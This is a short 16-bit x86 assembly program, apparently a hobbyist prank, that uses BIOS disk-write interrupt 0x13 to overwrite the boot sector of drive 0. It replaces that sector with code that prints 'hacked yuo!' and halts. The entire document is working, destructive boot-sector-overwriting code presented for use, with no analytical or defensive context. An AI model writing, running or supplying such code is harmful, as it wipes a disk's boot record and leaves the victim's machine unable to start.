org 0x0
use16

endl equ 0xa

; Program that changes the bootloader????

start:
    mov ax, cs
    mov es, ax

    mov ah, 0x3
    mov al, 1
    xor ch, ch
    mov cl, 1
    xor dh, dh
    xor dl, dl
    lea bx, [bootloader]
    int 0x13

    retf

bootloader:
    lea si, [0x7c00+(msg-bootloader)]
    mov ah, 0xe
    xor bh, bh
.loop:
    lodsb
    test al, al
    jz halt
    int 0x10
    jmp .loop
halt:
    cli
    hlt

msg db "hacked yuo!", 0

db (bootloader+510)-($-$$) dup(0)
dw 0xaa55